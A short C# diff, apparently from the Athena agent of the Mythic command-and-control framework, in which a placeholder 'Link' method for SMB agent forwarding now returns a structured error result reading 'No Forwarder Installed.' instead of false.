@@ -1,5 +1,6 @@
 ﻿using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
+using PluginBase;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Threading.Tasks;
@@ -22,9 +23,15 @@ namespace Athena.Config
         }
 
         //Link to the Athena SMB Agent
-        public async Task<bool> Link(MythicJob job)
+        public async Task<ResponseResult> Link(MythicJob job)
         {
-            return false;
+            return new ResponseResult
+            {
+                status = "error",
+                completed = "true",
+                task_id = job.task.id,
+                user_output = "No Forwarder Installed."
+            };
         }
         public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
         {
